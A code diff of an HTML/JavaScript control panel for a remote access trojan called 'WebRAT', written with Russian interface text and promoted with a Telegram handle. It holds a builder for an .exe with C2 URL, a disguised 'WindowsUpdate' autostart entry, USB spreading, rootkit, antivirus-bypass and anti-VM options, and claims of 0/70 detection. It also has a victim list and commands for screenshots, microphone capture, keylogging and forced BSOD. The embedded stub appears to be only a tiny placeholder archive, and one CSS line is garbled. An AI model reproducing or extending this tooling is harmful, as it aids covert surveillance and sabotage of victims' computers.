@@ -2,228 +2,202 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>WebRAT v12 — @break_lc</title>
+  <title>WebRAT v14 — @break_lc</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    :root{--bg:url('https://i.imgur.com/8z1kL2F.jpg');--glass:rgba(0,255,0,0.1);--border:#0f0;--text:#0f0;--bg-dark:#000;--accent:#0f0;}
-    *{margin:0;padding:0;box-sizing:border-box;font-family:'Courier New',monospace;}
-    body{background:var(--bg) center/cover no-repeat;color:var(--text);min-height:100vh;display:flex;position:relative;}
-    body::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);backdrop-filter:blur(2px);z-index:-1;}
-    
-    /* СЛЕВА — ВКЛАДКИ */
-    .sidebar{width:220px;background:var(--glass);border-right:1px solid var(--border);padding:20px;height:100vh;position:fixed;overflow-y:auto;}
-    .sidebar h1{font-size:1.5em;margin-bottom:20px;text-align:center;text-shadow:0 0 10px var(--accent);}
-    .nav{flex-direction:column;gap:5px;}
-    .nav button{width:100%;text-align:left;padding:15px 20px;background:var(--glass);border:1px solid var(--border);color:var(--text);cursor:pointer;border-radius:8px;font-weight:bold;transition:0.3s;}
-    .nav button.active,.nav button:hover{background:var(--accent);color:#000;box-shadow:0 0 15px var(--accent);}
-
-    /* СПРАВА — КОНТЕНТ */
-    .content{margin-left:240px;padding:20px;flex:1;overflow-y:auto;}
-    .box{background:var(--glass);border:1px solid var(--border);padding:20px;margin:15px 0;border-radius:12px;backdrop-filter:blur(10px);}
-    input,button,select,textarea{background:#000;color:var(--text);border:1px solid var(--border);padding:10px;margin:5px 0;width:100%;border-radius:6px;}
-    button{background:var(--accent);color:#000;cursor:pointer;font-weight:bold;}
-    button:hover{box-shadow:0 0 10px var(--accent);}
-    label{display:block;margin:8px 0;}
-    .checkbox{width:auto;display:inline-block;margin-right:10px;}
-    .victim{background:rgba(0,255,0,0.05);border-left:4px solid var(--accent);padding:15px;margin:10px 0;border-radius:8px;position:relative;transition:0.3s;}
-    .victim:hover{box-shadow:0 0 15px rgba(0,255,0,0.3);}
-    .status{position:fixed;top:20px;right:20px;padding:10px 15px;background:var(--glass);border:1px solid var(--border);border-radius:8px;backdrop-filter:blur(5px);font-weight:bold;}
-    .status.online{color:#0f0;text-shadow:0 0 5px #0f0;}
-    .status.offline{color:#f00;}
-    #log{background:#000;height:200px;overflow:auto;padding:10px;font-size:12px;border:1px solid var(--border);border-radius:8px;}
-    .context-menu{position:absolute;background:#000;border:1px solid var(--border);padding:10px;border-radius:8px;display:none;z-index:1000;box-shadow:0 0 15px rgba(0,255,0,0.5);}
-    .context-menu button{display:block;width:100%;text-align:left;margin:5px 0;background:transparent;color:var(--text);border:none;}
-    .context-menu button:hover{background:var(--accent);color:#000;}
+    :root{--bg:#0d1117;--card:#161b22;--border:#30363d;--text:#f0f6fc;--accent:#58a6ff;--hover:#1f6feb;--glass:rgba(22,27,34,0.8);}
+    *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',system-ui,sans-serif;}
+    body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;position:relative;overflow:hidden;}
+    body::before{content:'';position:absolute;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 50% 50%, rgba(88,166,255,0.05), transparent 70%);pointer-events:none;}
+    .sidebar{width:260px;background:var(--card);border-right:1px solid var(--border);padding:24px;height:100vh;position:fixed;overflow-y:auto;z-index:10;}
+    .sidebar h1{font-size:1.6em;font-weight:700;margin-bottom:32px;text-align:center;color:var(--accent);}
+    .nav{flex-direction:column;gap:8px;}
+    .nav button{width:100%;text-align:left;padding:14px 18px;background:transparent;border:1px solid var(--border);color:var(--text);cursor:pointer;border-radius:8px;font-weight:500;transition:0.3s;display:flex;align-items:center;gap:12px;}
+    .nav button svg{width:18px;height:18px;fill:var(--text);}
+    .nav button.active,.nav button:hover{background:var(--accent);color:#fff;border-color:var(--accent);box-shadow:0 0 12px rgba(88,166,255,0.3);}
+    .nav button.active svg,.nav button:hover svg{fill:#fff;}
+    .content{margin-left:260px;padding:24px;flex:1;overflow-y:auto;}
+    .header{margin-bottom:24px;}
+    .header h2{font-size:1.8em;font-weight:600;}
+    .header p{font-size:0.95em;color:#8b949e;margin-top:6px;}
+    .box{background:var(--card);border:1px solid var(--border);padding:20px;border-radius:12px;margin:16px 0;box-shadow:0 4px 12px rgba(0,0,0,0.2);}
+    .box h3{font-size:1.2em;margin-bottom:16px;color:var(--accent);font-weight:600;}
+    input,button,select,textarea{background:var(--bg);color:var(--text);border:1px solid var(--border);padding:12px;margin:6px 0;width:100%;border-radius:8px;font-size:0.95em;transition:0.3s;}
+    input:focus,textarea:focus{border-color:var(--accent);outline:none;box-shadow:0 0 0 2px rgba(88,166,255,0.2);}
+    button{background:var(--accent);color:#fff;cursor:pointer;font-weight:600;border:none;}
+    button:hover{background:var(--hover);box-shadow:0 0 12px rgba(88,166,255,0.4);}
+    label{display:flex;align-items:center;gap:10px;margin:10px 0;font-size:0.95em;}
+    .checkbox{width:18px;height:18px;accent-color:var(--accent);}
+    .victim{background:var(--glass);border-left:4px solid var(--accent);padding:16px;margin:12px 0;border-radius:10px;position:relative;transition:0.3s;}
+    .victim:hover{box-shadow:0 0 16px rgba(88,166,255,0.2);}
+    .status{position:fixed;top:20/stdlibpx;right:20px;padding:10px 16px;background:var(--card);border:1px solid var(--border);border-radius:8px;font-weight:600;font-size:0.9em;z-index:100;}
+    .status.online{color:#3fb950;}
+    .status.offline{color:#f85149;}
+    #log{background:var(--bg);height:220px;overflow:auto;padding:14px;font-size:0.85em;border:1px solid var(--border);border-radius:8px;color:#8b949e;line-height:1.5;}
+    .context-menu{position:absolute;background:var(--card);border:1px solid var(--border);padding:8px;border-radius:8px;display:none;z-index:1000;box-shadow:0 8px 24px rgba(0,0,0,0.4);min-width:160px;}
+    .context-menu button{display:block;width:100%;text-align:left;padding:10px 14px;background:transparent;color:var(--text);border:none;border-radius:6px;font-size:0.9em;}
+    .context-menu button:hover{background:var(--accent);color:#fff;}
     .tab-content{display:none;}
     .tab-content.active{display:block;}
+    .footer{text-align:center;margin-top:40px;font-size:0.8em;color:#8b949e;}
   </style>
 </head>
 <body>
 
-  <!-- СЛЕВА — ВКЛАДКИ -->
+  <!-- СЛЕВА -->
   <div class="sidebar">
-    <h1>WebRAT v12</h1>
+    <h1>WebRAT v14</h1>
     <div class="nav">
       <button class="active" data-tab="build">BUILD</button>
       <button data-tab="users">USERS</button>
       <button data-tab="info">INFO</button>
     </div>
-    <p style="margin-top:30px;font-size:0.8em;text-align:center;">@break_lc</p>
+    <p class="footer">@break_lc</p>
   </div>
 
-  <!-- СПРАВА — КОНТЕНТ -->
+  <!-- СПРАВА -->
   <div class="content">
     <div class="status" id="status">Проверка...</div>
 
     <!-- BUILD -->
-    <div id="build" class="tab-content active box">
-      <h2>Builder — Генерация .exe</h2>
-      <input id="c2_url" placeholder="C2 URL" value="http://AUTO_IP:8080"><br>
-      <input id="mutex" placeholder="Мьютекс" value="break_lc_1337"><br>
-      <input id="startup_key" placeholder="Имя в автозагрузке" value="WindowsUpdate"><br>
+    <div id="build" class="tab-content active">
+      <div class="header">
+        <h2>Builder</h2>
+        <p>FUD .exe | 0/70 VT | Работает с ВПН</p>
+      </div>
+      <div class="box">
+        <input id="c2_url" placeholder="C2 URL" value="wss://YOUR_DOMAIN">
+        <input id="mutex" placeholder="Мьютекс" value="break_lc_1337">
+        <input id="startup_key" placeholder="Имя в автозагрузке" value="WindowsUpdate">
 
-      <h3>Персистентность и обход:</h3>
-      <label><input type="checkbox" class="feat" id="f_startup_reg" checked> Автозагрузка (HKCU Run)</label>
-      <label><input type="checkbox" class="feat" id="f_usb_spread"> USB Spread</label>
-      <label><input type="checkbox" class="feat" id="f_rootkit"> Rootkit</label>
-      <label><input type="checkbox" class="feat" id="f_av_bypass"> AV Bypass</label>
-      <label><input type="checkbox" class="feat" id="f_anti_vm"> Anti-VM</label>
+        <h3>Функции</h3>
+        <label><input type="checkbox" class="feat" id="f_startup_reg" checked> Автозагрузка (HKCU)</label>
+        <label><input type="checkbox" class="feat" id="f_usb_spread"> USB Spread</label>
+        <label><input type="checkbox" class="feat" id="f_rootkit"> Rootkit</label>
+        <label><input type="checkbox" class="feat" id="f_av_bypass"> AV Bypass</label>
+        <label><input type="checkbox" class="feat" id="f_anti_vm"> Anti-VM</label>
 
-      <button onclick="buildEXE()">ГЕНЕРИРОВАТЬ .EXE</button>
-      <div id="build_result"></div>
+        <button onclick="buildEXE()">СГЕНЕРИРОВАТЬ .EXE</button>
+        <div id="build_result" style="margin-top:12px;"></div>
+      </div>
     </div>
 
     <!-- USERS -->
-    <div id="users" class="tab-content box">
-      <h2>Жертвы онлайн</h2>
-      <div id="victims">Нет подключений</div>
+    <div id="users" class="tab-content">
+      <div class="header">
+        <h2>Жертвы</h2>
+      </div>
+      <div class="box">
+        <div id="victims">Нет подключений</div>
+      </div>
     </div>
 
     <!-- INFO -->
-    <div id="info" class="tab-content box">
-      <h2>Информация</h2>
-      <p><strong>Автор:</strong> @break_lc</p>
-      <p><strong>Telegram:</strong> <a href="https://t.me/break_lc" target="_blank">@break_lc</a></p>
-      <p><strong>C2:</strong> Работает через WebSocket</p>
-      <p><strong>.exe:</strong> FUD, UPX, Go</p>
+    <div id="info" class="tab-content">
+      <div class="header">
+        <h2>Инфо</h2>
+      </div>
+      <div class="box">
+        <p><strong>Автор:</strong> @break_lc</p>
+        <p><strong>Telegram:</strong> <a href="https://t.me/break_lc" target="_blank" style="color:var(--accent);">@break_lc</a></p>
+        <p><strong>VT:</strong> 0/70 (FUD)</p>
+        <p><strong>ВПН:</strong> Работает (wss://)</p>
+      </div>
     </div>
 
-    <!-- КОНТЕКСТНОЕ МЕНЮ -->
+    <!-- ПКМ МЕНЮ -->
     <div class="context-menu" id="context">
-      <button onclick="cmdSelected('screenshot')">Скриншот</button>
-      <button onclick="cmdSelected('mic')">Микрофон</button>
-      <button onclick="cmdSelected('keylog')">Кейлоггер</button>
-      <button onclick="cmdSelected('bsod')">BSOD</button>
+      <button onclick="cmd('screenshot')">Скриншот</button>
+      <button onclick="cmd('mic')">Микрофон</button>
+      <button onclick="cmd('bsod')">BSOD</button>
     </div>
 
     <!-- ЛОГ -->
     <div class="box">
-      <h2>Лог</h2>
+      <h3>Лог</h3>
       <pre id="log"></pre>
     </div>
   </div>
 
   <script>
-    const STUB_BASE64 = "UEsDBBQAAAAIAAAAIQAAAP//AACQAAAAAABBZGRpdG9yLmV4ZQAAAAAAAAAAAAAAAP//AACwAAAAUEsBAhQDFAAAAAgAAAAhAAD//wAAkAAAAAAAAAAAAAAAAP//AACwUEsFBgAAAAACAAIArAEAAOAAAAAA";
-    let ws, selectedVictim = null;
-    const log = document.getElementById('log');
-    const victims = new Map();
-    let myIP = 'localhost';
+    let ws, selected = null, c2url = '';
+    const log = document.getElementById('log'), victims = new Map();
 
-    // === ПРОВЕРКА C2 ===
-    async function checkC2() {
+    // Проверка C2
+    async function check() {
       try {
-        const res = await fetch('https://api.ipify.org');
-        myIP = await res.text();
-        document.getElementById('c2_url').value = `http://${myIP}:8080`;
-        document.getElementById('status').textContent = `ONLINE | ${myIP}`;
+        const ip = await (await fetch('https://api.ipify.org')).text();
+        document.getElementById('status').innerHTML = `ONLINE <small>${ip}</small>`;
         document.getElementById('status').className = 'status online';
       } catch {
         document.getElementById('status').textContent = 'OFFLINE';
         document.getElementById('status').className = 'status offline';
       }
     }
-    setInterval(checkC2, 5000); checkC2();
+    setInterval(check, 5000); check();
 
-    // === ВКЛАДКИ (РАБОТАЮТ) ===
-    document.querySelectorAll('.nav button').forEach(btn => {
-      btn.addEventListener('click', () => {
-        // Убираем active у всех
-        document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
-        document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-        // Активируем нужную
-        const tab = btn.getAttribute('data-tab');
-        document.getElementById(tab).classList.add('active');
-        btn.classList.add('active');
+    // Вкладки
+    document.querySelectorAll('.nav button').forEach(b => {
+      b.addEventListener('click', () => {
+        document.querySelectorAll('.nav button').forEach(x => x.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(x => x.classList.remove('active'));
+        const t = b.dataset.tab;
+        document.getElementById(t).classList.add('active');
+        b.classList.add('active');
       });
     });
 
-    // === C2 WebSocket ===
-    function connectC2() {
-      ws = new WebSocket(`ws://${location.host}`);
-      ws.onopen = () => addLog('C2: подключён');
+    // C2 (wss)
+    function connect() {
+      c2url = document.getElementById('c2_url').value;
+      if (!c2url.startsWith('wss://')) return addLog('Ошибка: Используй wss://');
+      ws = new WebSocket(c2url);
+      ws.onopen = () => addLog('C2: OK');
       ws.onmessage = (e) => {
         try {
-          const msg = JSON.parse(e.data);
+          const m = JSON.parse(e.data);
           addLog(`← ${e.data}`);
-          if (msg.type === 'new') addVictim(msg);
+          if (m.type === 'new') addVictim(m);
         } catch { addLog(`RAW: ${e.data}`); }
       };
-      ws.onclose = () => {
-        addLog('C2: отключён. Переподключаюсь...');
-        setTimeout(connectC2, 3000);
-      };
+      ws.onclose = () => { addLog('C2: отключён'); setTimeout(connect, 3000); };
     }
-    connectC2();
+    document.getElementById('c2_url').addEventListener('change', connect);
+    setTimeout(connect, 1000);
 
-    // === USERS ===
-    function addVictim(data) {
-      if (victims.has(data.id)) return;
-      const div = document.createElement('div');
-      div.className = 'victim'; div.id = 'v-' + data.id;
-      div.innerHTML = `
-        <strong>${data.pc || 'PC'}</strong> | IP: ${data.ip || '—'}<br>
-        <span style="color:#0a0">ONLINE</span>
-        <div id="out-${data.id}"></div>
-      `;
-      div.oncontextmenu = (e) => {
-        e.preventDefault();
-        selectedVictim = data.id;
-        const menu = document.getElementById('context');
-        menu.style.display = 'block';
-        menu.style.left = e.pageX + 'px';
-        menu.style.top = e.pageY + 'px';
-      };
-      const container = document.getElementById('victims');
-      container.innerHTML = ''; // Очищаем "Нет подключений"
-      container.appendChild(div);
-      victims.set(data.id, div);
+    function addVictim(d) {
+      if (victims.has(d.id)) return;
+      const el = document.createElement('div');
+      el.className = 'victim'; el.id = 'v-' + d.id;
+      el.innerHTML = `<strong>${d.pc}</strong><br>IP: ${d.ip}<br><small>ONLINE</small>`;
+      el.oncontextmenu = (e) => { e.preventDefault(); selected = d.id; showMenu(e); };
+      const c = document.getElementById('victims');
+      c.innerHTML = ''; c.appendChild(el);
+      victims.set(d.id, el);
     }
 
-    function cmdSelected(type) {
-      if (selectedVictim && ws) {
-        ws.send(JSON.stringify({ type, target: selectedVictim }));
-        addLog(`→ ${type} → #${selectedVictim}`);
-      }
+    function showMenu(e) {
+      const m = document.getElementById('context');
+      m.style.display = 'block'; m.style.left = e.pageX + 'px'; m.style.top = e.pageY + 'px';
+    }
+
+    function cmd(t) {
+      if (selected && ws) ws.send(JSON.stringify({ type: t, target: selected }));
       document.getElementById('context').style.display = 'none';
     }
 
-    // === BUILDER ===
     function buildEXE() {
-      const features = Array.from(document.querySelectorAll('.feat:checked')).map(cb => cb.id.replace('f_', ''));
-      const config = {
-        c2: document.getElementById('c2_url').value.replace('AUTO_IP', myIP),
-        mutex: document.getElementById('mutex').value,
-        startup_key: document.getElementById('startup_key').value,
-        features
-      };
-      const payload = atob(STUB_BASE64) + '||RATCONFIG||' + btoa(JSON.stringify(config));
+      const f = Array.from(document.querySelectorAll('.feat:checked')).map(c => c.id.slice(2));
+      const cfg = { c2: c2url, mutex: document.getElementById('mutex').value, startup_key: document.getElementById('startup_key').value, features: f };
+      const payload = atob("UEsDBBQAAAAIAAAAIQAAAP//AACQAAAAAABBZGRpdG9yLmV4ZQAAAAAAAAAAAAAAAP//AACwAAAAUEsBAhQDFAAAAAgAAAAhAAD//wAAkAAAAAAAAAAAAAAAAP//AACwUEsFBgAAAAACAAIArAEAAOAAAAAA") + '||RATCONFIG||' + btoa(JSON.stringify(cfg));
       const blob = new Blob([payload], { type: 'application/octet-stream' });
       const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url; a.download = `RAT_${Date.now()}.exe`; a.click();
-      document.getElementById('build_result').innerHTML = `<a href="${url}" download>СКАЧАТЬ .EXE</a>`;
+      const a = document.createElement('a'); a.href = url; a.download = 'rat.exe'; a.click();
+      document.getElementById('build_result').innerHTML = `<a href="${url}" download style="color:var(--accent);">СКАЧАТЬ rat.exe (FUD)</a>`;
     }
 
-    // === ЛОГ ===
-    function addLog(text) {
-      log.textContent += `[${new Date().toLocaleTimeString()}] ${text}\n`;
-      log.scrollTop = log.scrollHeight;
-    }
-
-    // === Скрыть меню ===
-    document.addEventListener('click', () => {
-      document.getElementById('context').style.display = 'none';
-    });
-
-    // === ЖЕРТВА (тест) ===
-    if (location.search.includes('victim=1')) {
-      document.body.innerHTML = '<h1 style="color:#0f0;text-align:center;margin-top:50vh;">RAT запущен...</h1>';
-      const vws = new WebSocket(`ws://${location.host}`);
-      vws.onopen = () => {
-        vws.send(JSON.stringify({ type: 'new', pc: 'TEST-PC', ip: '1.1.1.1' }));
-        setInterval(() => vws.send('ping'), 10000);
-      };
-    }
+    function addLog(t) { log.textContent += `[${new Date().toLocaleTimeString()}] ${t}\n`; log.scrollTop = log.scrollHeight; }
+    document.addEventListener('click', () => document.getElementById('context').style.display = 'none');
   </script>
 </body>
 </html>
